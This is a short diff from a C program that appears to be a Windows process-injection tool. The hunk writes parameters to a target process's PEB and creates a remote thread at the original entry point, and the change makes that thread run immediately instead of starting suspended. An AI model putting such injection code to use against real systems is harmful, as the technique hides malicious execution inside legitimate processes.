@@ -321,7 +321,7 @@ int main(int argc,char *argv[] )
 	printf("[+] writing our paramters to the process peb 0x%08p\n", peb);
 
 	HANDLE hThread;
-	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, TRUE, 0, 0, 0, NULL);
+	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, FALSE, 0, 0, 0, NULL);
 	printf("[+] Thread created with handle %x\n", hThread);
 	if (FALSE == NT_SUCCESS(ret))
 	{
